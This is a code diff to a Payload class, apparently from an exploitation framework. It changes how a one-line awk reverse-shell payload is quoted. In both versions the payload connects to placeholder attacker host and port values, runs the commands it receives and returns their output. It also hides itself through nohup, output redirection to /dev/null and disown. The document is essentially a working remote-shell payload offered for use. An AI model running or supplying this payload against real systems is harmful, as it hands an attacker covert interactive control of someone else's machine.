@@ -23,4 +23,4 @@ class Payload:
 
     attrs = {}
 
-    data = r"nohup awk 'BEGIN {s = \"/inet/tcp/0/*LHOST*/*LPORT*\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' > /dev/null 2>&1 & disown"
+    data = "nohup awk 'BEGIN {s = \"/inet/tcp/0/*LHOST*/*LPORT*\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' > /dev/null 2>&1 & disown"
